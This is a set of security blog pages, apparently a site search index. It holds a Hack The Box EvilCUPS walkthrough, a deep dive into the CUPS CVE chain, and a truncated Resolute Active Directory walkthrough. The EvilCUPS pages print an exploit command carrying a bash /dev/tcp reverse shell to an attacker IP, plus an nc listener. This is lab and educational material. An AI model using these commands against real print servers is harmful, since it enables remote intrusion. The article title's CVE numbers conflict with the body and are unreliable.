        "content": "EvilCUPS Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/EvilCUPS How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\nnmap $box -Pn -oA TCPbasicScan kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:16:48 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:16 BST Nmap scan report for 10.129.231.157 Host is up (0.036s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 631/tcp open ipp Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds Initial thoughts: I am doing this box purely to understand the recent CVE-2024-47176 further so know that 631 will be interesting. Basic UDP Scan:\nsudo nmap $box -sU -Pn -oA UDPbasicScan kali in 46.02-HTB/BlogEntriesMade/EvilCups/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:17:00 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 07:21 BST Stats: 0:05:57 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 35.08% done; ETC: 07:38 (0:10:50 remaining) Stats: 0:16:46 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 96.55% done; ETC: 07:38 (0:00:36 remaining) Nmap scan report for 10.129.231.157 Host is up (0.035s latency). Not shown: 997 closed udp ports (port-unreach) PORT STATE SERVICE 68/udp open|filtered dhcpc 631/udp open|filtered ipp 5353/udp open|filtered zeroconf Nmap done: 1 IP address (1 host up) scanned in 1050.49 seconds Initial thoughts:\nAs expected IPP and CUPS. CUPS 631: As we know CUPS is running we can visit the web server by visiting http://[ip]:631\nI try the administration button but this is denied:\nCommon UNIX Printing System (CUPS) Primer: What is CUPS?:\nCUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems. It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols. Supports printing to both local and network printers, handling print queues and printer management. Key Features of CUPS:\nPrint Server Functionality: Manages printers and print jobs on both local machines and networked environments. Protocol Support: Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more. Driver Flexibility: Allows the use of a variety of printer drivers, supporting a wide range of printers. Web Interface: Provides a web-based interface for configuring printers, managing jobs, and accessing logs. Authentication and Security: Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing. How CUPS Works:\nQueue System: CUPS handles print jobs by placing them in a queue, where they are processed and sent to the printer in the order they are received. Backend System: CUPS uses backends to communicate with printers. The most common backend is IPP, but others like USB and LPD are also available. Filters: CUPS uses filters to convert print data from application formats (like PDF or PostScript) into formats the printer can understand. Security Considerations:\nCUPS exposes ports (usually 631 for IPP) which, if misconfigured, could lead to unauthorized access. Proper configuration and updates are critical to avoid vulnerabilities, especially in networked environments where CUPS could be exploited remotely. Internet Printing Protocol (IPP) Primer: Definition:\nIPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network. It is the core protocol used by CUPS and other modern printing systems for handling print tasks. Key Features of IPP:\nPrinting Control: IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities. Standardization: Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol. Support for Secure Transmission: IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server. Advanced Printer Features: Supports a wide range of printing features, such as duplex printing, media selection, and finishing options. How IPP Works:\nJob Submission: Clients send print requests (in IPP format) to a printer or print server. Job and Queue Management: The protocol allows clients to monitor and manage print jobs, with the ability to query job status, hold jobs, or cancel them. Communication: IPP communicates over port 631 by default, using HTTP as the transport layer. This allows it to be integrated into web-based services. Security Features:\nAuthentication and Encryption: Supports various authentication mechanisms and encryption via TLS, ensuring only authorized users can submit or manage print jobs. Access Control: IPP can restrict access to certain users or devices, enhancing security in environments with multiple users. Common Use:\nIPP is used in most modern networked printers and printing systems (like CUPS) due to its flexibility, security features, and ability to handle complex printing tasks. IPP\u0026rsquo;s versatility and security make it a preferred protocol for managing printers, especially in networked environments PostScript Printer Description (PPD) Primer: What is a PPD File?\nA PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer. PPD files provide detailed information about the printer\u0026rsquo;s features, such as supported paper sizes, resolution, duplexing, and more. A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer. Purpose of a PPD File:\nPrinter Configuration: PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly. Feature Customization: They describe optional features like trays, memory, or color modes, enabling users to select these features during printing. Structure of a PPD File:\nHeader: Contains general information about the printer, such as its model name, manufacturer, and supported languages. Printer Capabilities: Details the specific print features like: Supported page sizes (e.g., A4, Letter) Print resolution (e.g., 600 DPI, 1200 DPI) Duplex printing capabilities (automatic double-sided printing) Option Keywords: Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching. How a PPD File Works:\nWhen a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand. It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.). Common Use Cases:\nPostScript Printers: Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features. Driver Customization: Often included with printer drivers or downloaded from the printer manufacturer’s website, ensuring that all printer features are available to the user. Security and Maintenance:\nMisconfiguration Issues: Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality. Modifications: PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues. Attack Chain: If you would like a deeper dive: I have written a deep dive of this exploitation chain which you can find here:\n+Deep Dive+: https://bloodstiller.com/articles/understandingcupsexploitation Attack Chain Summarized:\nForce the target machine to connect back to our malicious IPP server by sending a crafted packet to port 631 thereby starting the process of creating a fake printer. Return a malicious IPP attribute string to inject our controlled PPD directives to the temporary file. Either print a test page from our fake printer if we have access to the CUPS web panel to trigger the PPD directives (and our commands) to be executed or wait for a print job to be sent to the fake printer. 2. Foothold: Exploiting the CUPS vulnerabilities to get a low privilege shell: Preparing the CUPS Exploit: I will be using ippsec\u0026rsquo;s cups exploit for this attack:\nhttps://github.com/ippsec/evil-cups Preparing Exploit:\ngit clone https://github.com/IppSec/evil-cups.git cd evil-cups Prepare Python Venv:\npython3 -m venv evilCups source evilCups/bin/activate +Note+: I use venv\u0026rsquo;s as it allows me to install different deps without causing conflicts with my base python installation. Install Requirements:\npip3 install -r requirements.txt Running the CUPS Exploit: Running the exploit to send the payload:\npython3 evilcups.py [AttackIP] [VictimIP] \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/[AttackIP]/[AttackPort] 0\u0026gt;\u0026amp;1'\u0026quot; python3 evilcups.py 10.10.14.58 $box \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.58/443 0\u0026gt;\u0026amp;1'\u0026quot; Now the payload is sent we can move onto the next stage of triggering the exploit: Start our listener:\nrlwrap -cAr nc -lnvp 443 Trigger the exploit:\nNavigating the CUPS web-console we can see our malicious printer is listed:\nPrinting our test page to trigger the exploit:\nIn order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the \u0026ldquo;Test Print\u0026rdquo; functionality. Low Priv Shell Caught:\nGet our User Flag:\n3. Privilege Escalation: Reading Cached Print Queues to retrieve the Root Password: Checking for print jobs in the CUPS web console:\nAs this is a printer based machine lets check if there are any interesting print jobs. Navigating to the web-console \u0026amp; clicking on Jobs we can see a single job is listed for the authentic printer Canon_MB2300_series You may notice the -1 after this tells us this is the first print job for this printer. (more on this soon) Trying to read the cached Jobs:\nCUPS keeps it\u0026rsquo;s cached jobs in the default location: /var/spool/cups/ however when I try and list the contents of the folder I get the following error: Discovering we have executable rights over the folder:\nListing the contents of /var/spools we can see we have execute privileges on the cups directory but we cannot list the contents: This means if we can establish the file-name for any files in the folder we can execute cat etc on the file to list the contents. Default naming structure format for cached Print jobs:\nThe naming structure for completed jobs in the cups directory is as follows: d-[print job]-[page number] d = The cached print job files in the CUPS directory are always prefixed with \u0026ldquo;d\u0026rdquo;. Print job = 5 digits (e.g. 00001) Page number = 3 digits (e.g. 001) As we know there is only 1 printer, Canon_MB2300_series \u0026amp; it had only 1 job (see below) therefore we can infer the file will be called d00001-001. Extracting the root password from the cached job:\ncat /var/spool/cups/d00001-001\nScrolling down we can get root users pass:\n+Note+: This is very CTF, but I don\u0026rsquo;t mind.\n4. Ownership: SSH\u0026rsquo;ing As Root to get the root flag: SSH back in as root:\nGet Root Flag:\nLessons Learned: What did I learn? Reading the https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ I learned ALOT about CUPS, PPD, IPP etc. What silly mistakes did I make? Forgot a closing quotation mark a few times, that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/evilcups-box\/"
    },
    
    "http:\/\/localhost:1313\/articles\/understandingcupsexploitation\/": {
        "title": "Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076",
        "tags": ["CVE-2024-4176","CVE-2024-4175","CVE-2024-4177","CVE-2024-4076","Linux","CUPS",],
        "content": "Introduction The Common UNIX Printing System (CUPS) is a crucial component in many Unix-like operating systems, including Linux and macOS. Recent discoveries have revealed significant vulnerabilities in CUPS, potentially exposing systems to serious security risks. This post will explore these vulnerabilities and demonstrate how they can be exploited.\nCUPS, IPP \u0026amp; PPD: A Primer Common UNIX Printing System (CUPS) Primer: What is CUPS?:\nCUPS (Common UNIX Printing System) is an open-source printing system developed by Apple for macOS, Linux, and other UNIX-like operating systems. It allows a computer to act as a print server, enabling clients to send print jobs to printers using Internet Printing Protocol (IPP) and other protocols. Supports printing to both local and network printers, handling print queues and printer management. Key Features of CUPS:\nPrint Server Functionality: Manages printers and print jobs on both local machines and networked environments. Protocol Support: Uses IPP as its core protocol but also supports older protocols such as Line Printer Daemon (LPD), Server Message Block (SMB), and more. Driver Flexibility: Allows the use of a variety of printer drivers, supporting a wide range of printers. Web Interface: Provides a web-based interface for configuring printers, managing jobs, and accessing logs. Authentication and Security: Supports various authentication methods (e.g., Basic, Digest, Kerberos) and encrypts connections using TLS to ensure secure printing. Internet Printing Protocol (IPP) Primer: Definition:\nIPP is a network protocol used for communication between client devices and printers (or print servers). It allows for the submission, management, and control of print jobs over a network. It is the core protocol used by CUPS and other modern printing systems for handling print tasks. Key Features of IPP:\nPrinting Control: IPP enables clients to send print jobs to printers, cancel jobs, check the status of printers and jobs, and retrieve printer capabilities. Standardization: Defined by the Internet Engineering Task Force (IETF), IPP is a well-documented, standardized protocol. Support for Secure Transmission: IPP can use HTTP over SSL (HTTPS) to ensure secure, encrypted communication between client and server. Advanced Printer Features: Supports a wide range of printing features, such as duplex printing, media selection, and finishing options. PostScript Printer Description (PPD) Primer: What is a PPD File?\nA PostScript Printer Description (PPD) file is a configuration file used by printing systems to describe the capabilities and features of a PostScript printer. PPD files provide detailed information about the printer\u0026rsquo;s features, such as supported paper sizes, resolution, duplexing, and more. A PPD contains the PostScript commands (code) which is used to invoke features for the print job handled by that printer. Purpose of a PPD File:\nPrinter Configuration: PPD files allow the operating system and printing system (e.g., CUPS) to configure the printer correctly. Feature Customization: They describe optional features like trays, memory, or color modes, enabling users to select these features during printing. Structure of a PPD File:\nHeader: Contains general information about the printer, such as its model name, manufacturer, and supported languages. Printer Capabilities: Details the specific print features like: Supported page sizes (e.g., A4, Letter) Print resolution (e.g., 600 DPI, 1200 DPI) Duplex printing capabilities (automatic double-sided printing) Option Keywords: Defines selectable options for users, such as media types, color modes, or finishing options like stapling or punching. How a PPD File Works:\nWhen a print job is initiated, the PPD file helps the system translate the print request into a format the printer can understand. It provides the necessary instructions for the printer driver to produce the correct output by interpreting the selected options (resolution, paper size, etc.). Common Use Cases:\nPostScript Printers: Primarily used for configuring PostScript printers, but they can also be used by CUPS to manage non-PostScript printers by mapping specific print features. Driver Customization: Often included with printer drivers or downloaded from the printer manufacturer’s website, ensuring that all printer features are available to the user. Security and Maintenance:\nMisconfiguration Issues: Incorrect or outdated PPD files may lead to misconfiguration of print jobs, causing print failures or reduced functionality. Modifications: PPD files can be edited manually to customize printer behavior, though improper editing may lead to errors or printing issues. The Vulnerabilities All discovered by evil-socket CVE-2024-47176: Malicious Packet Exploitation: Affects the cups-browsed component If a packet containing a URL in the form 0 3 http://\u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt;/printers/Name is sent to UDP port 631 on a vulnerable system, it results in cups-browsed connecting back to that malicious URL and sending back the kernel version and architecture of the vulnerable system. CVE-2024-47175: Fake Printer Addition: Vulnerability in libppd Allows an attacker to add a fake printer to the CUPS service Stems from improper handling of untrusted input in PPD (PostScript Printer Description) file creation CVE-2024-47177: Foomatic-RIP Filter Exploitation: The Foomatic-RIP filter is an older filter with a history of being exploitable It accepts the FoomaticRIPCommandLine directive in the PPD, which allows any command to be executed Vulnerability persists due to backward compatibility issues with older printers CVE-2024-47076: Exploiting PPD Instructions and Filters: Vulnerability in libcupsfilters PPD files configure how CUPS handles printing tasks, including specifying filters Attack Process Deep Dive: Attack Chain Summarized: Force the target machine to connect back to our malicious IPP server by sending a crafted packet to port 631 thereby starting the process of creating a fake printer. Return a malicious IPP attribute string to inject our controlled PPD directives to the temporary file. Either print a test page from our fake printer if we have access to the CUPS web panel to trigger the PPD directives (and our commands) to be executed or wait for a print job to be sent to the fake printer. Detailed Exploitation Process: Step 1: Getting the printer to connect back (CVE-2024-47176): Vulnerability in cups-browsed component Exploit method: Send a packet containing a URL in the form: 0 3 http://\u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt;/printers/Name Target: UDP port 631 on the vulnerable system Result: cups-browsed connects back to the malicious URL, revealing: Kernel version System architecture Step 2: Adding the Fake Printer (CVE-2024-47175): Vulnerability in libppd Process: The malicious URL is mistaken for a legitimate printer CUPS sends a Get-Printer-Attributes request for vendor, model, etc. Attacker can manipulate this information to add a fake printer to CUPS New printer addition doesn\u0026rsquo;t notify the user by default PPD File Creation and Conversion:\nReturned data is stored in a temporary PPD file The file is converted using libppd without proper sanitization Vulnerable code snippet: // Vulnerable Code cupsFilePrintf(fp, \u0026#34;*Manufacturer: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, make); // Vulnerable cupsFilePrintf(fp, \u0026#34;*ModelName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;, make, model); // Vulnerable cupsFilePrintf(fp, \u0026#34;*Product: \\\u0026#34;(%s %s)\\\u0026#34;\\n\u0026#34;, make, model); cupsFilePrintf(fp, \u0026#34;*NickName: \\\u0026#34;%s %s, %sdriverless, %s\\\u0026#34;\\n\u0026#34;, make, model, (is_fax ? \u0026#34;Fax, \u0026#34; : \u0026#34;\u0026#34;), VERSION); // Vulnerable cupsFilePrintf(fp, \u0026#34;*ShortNickName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;, make, model); Untrusted Input (Format String Vulnerability):\ncupsFilePrintf used without proper input validation Attacker can inject format specifiers (e.g., %n, %s) via make, model, or is_fax variables Potential impacts: Memory address leaks Memory corruption (buffer overflows, remote code execution) Attack Mechanism:\nAttacker provides crafted input with format string specifiers (e.g., %x, %n) If interpreted, can read unintended data or overwrite critical variables in memory Mitigation Steps:\nUse safer functions like snprintf to limit input size Sanitize user-controlled input Explicitly define format specifiers Validate all user inputs before processing Step 3: Exploiting PPD Instructions and Filters (CVE-2024-47076): Vulnerability in libcupsfilters PPD files configure how CUPS handles printing tasks, including specifying filters cupsFilter2 Directive: Tells CUPS which filter to run based on print job format and printer capabilities If manipulated, can alter which filter is executed, potentially running malicious code Step 4: Exploiting the Foomatic-RIP Filter (CVE-2024-47177): Foomatic-RIP is an older filter with a history of exploitability Accepts FoomaticRIPCommandLine directive in PPD, allowing arbitrary command execution Foomatic-RIP is a universal converter for various document formats Persistent vulnerability due to: Integration of foomatic-filters into CUPS without including a previous fix Backward compatibility requirements for older UNIX-based printers Step 5: Attack Execution: Once the fake printer is added and the malicious PPD file is in place:\nWait for a print job to be sent to the fake printer, or Trigger a test print from the CUPS web interface (if accessible) The malicious commands injected via the PPD file will be executed when the print job is processed This attack chain demonstrates the compounding effect of multiple vulnerabilities in a system. Always ensure proper permissions and ethical considerations before testing or demonstrating such exploits.\nExample of Exploitation. This example is taken from the HTB box EvilCUPS: https://app.hackthebox.com/machines/EvilCUPS You can see my full writeup here: https://bloodstiller.com/walkthroughs/evilcups-box/ Preparing the CUPS Exploit: I will be using ippsec\u0026rsquo;s cups exploit for this attack:\nhttps://github.com/ippsec/evil-cups Preparing Exploit:\ngit clone https://github.com/IppSec/evil-cups.git cd evil-cups Prepare Python Venv:\npython3 -m venv evilCups source evilCups/bin/activate +Note+: I use venv\u0026rsquo;s as it allows me to install different deps without causing conflicts with my base python installation. Install Requirements:\npip3 install -r requirements.txt Running the CUPS Exploit: Running the exploit to send the payload:\npython3 evilcups.py [AttackIP] [VictimIP] \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/[AttackIP]/[AttackPort] 0\u0026gt;\u0026amp;1'\u0026quot; python3 evilcups.py 10.10.14.58 $box \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.58/443 0\u0026gt;\u0026amp;1'\u0026quot; Now the payload is sent we can move onto the next stage of triggering the exploit: Start our listener:\nrlwrap -cAr nc -lnvp 443 Trigger the exploit:\nNavigating the CUPS web-console we can see our malicious printer is listed:\nPrinting our test page to trigger the exploit:\nIn order to activate the exploit and trigger the malicious PPD directives we need to either wait for a print job to be sent to the fake printer or we can trigger one ourselves using the \u0026ldquo;Test Print\u0026rdquo; functionality. Low Priv Shell Caught:\nConclusion The vulnerabilities in CUPS demonstrate the ongoing need for vigilance in system security, even in widely-used and well-established software.\nReferences CVE-2024-47176 CVE-2024-47175 CVE-2024-47177 CVE-2024-47076 Evil CUPS Exploit Repository ", 
        "url": "http:\/\/localhost:1313\/articles\/understandingcupsexploitation\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2021-42278\/": {
        "title": "CVE-2021-42278",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2021-42278\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cve-2021-42287\/": {
        "title": "CVE-2021-42287",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cve-2021-42287\/"
    },
    
    "http:\/\/localhost:1313\/tags\/nopac\/": {
        "title": "NoPac",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/nopac\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/resolute-box\/": {
        "title": "Resolute HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","Active Directory","NoPac","CVE-2021-42278","CVE-2021-42287","Download Cradle",],
        "content": "Resolute Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Resolute How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:36:50 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:36 BST Nmap scan report for 10.129.96.155 Host is up (0.040s latency). Not shown: 989 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds Initial thoughts: All great enumeration vectors below: DNS Kerberos SMB LDAP In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:37:03 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:38 BST Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 75.76% done; ETC: 09:38 (0:00:09 remaining) Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 75.95% done; ETC: 09:38 (0:00:09 remaining) Nmap scan report for 10.129.96.155 Host is up (0.038s latency). Not shown: 65511 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-20 08:45:53Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49686/tcp open msrpc Microsoft Windows RPC 49711/tcp open msrpc Microsoft Windows RPC 49789/tcp open unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=10/20%OT=53%CT=1%CU=37772%PV=Y%DS=2%DC=I%G=Y%TM=671 OS:4C1E3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6 OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O= OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80% OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q= OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y% OS:DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2024-10-20T08:46:54 |_ start_date: 2024-10-20T08:38:24 |_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 6m59s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Resolute | NetBIOS computer name: RESOLUTE\\x00 | Domain name: megabank.local | Forest name: megabank.local | FQDN: Resolute.megabank.local |_ System time: 2024-10-20T01:46:55-07:00 OS and Service detection performed. Please report any incorrect resu Findings: RPC is also running which is also to be expected. We have the domain name megabank.local LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in 46.02-HTB/BlogEntriesMade/Resolute/scans/ldap 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:39:16 zsh ❯ python3 ~/Desktop/WindowsTools/ldapchecker.py $box Attempting to connect to 10.129.96.155 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.96.155 with non-SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=megabank,DC=local CN=Configuration,DC=megabank,DC=local CN=Schema,CN=Configuration,DC=megabank,DC=local DC=DomainDnsZones,DC=megabank,DC=local DC=ForestDnsZones,DC=megabank,DC=local We have the domain functionaility level:\ndomainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. LDAP Group Enumeration: As my script auto enumerates this information: I check the file\u0026rsquo;s:\ngroupsLdap.txt groupsLdap_detailed.txt groupsLdap.txt provides a simple list of group names, so we can check for interesting groups:\ncat groupsLdap.txt Lets check for information in the description fields using 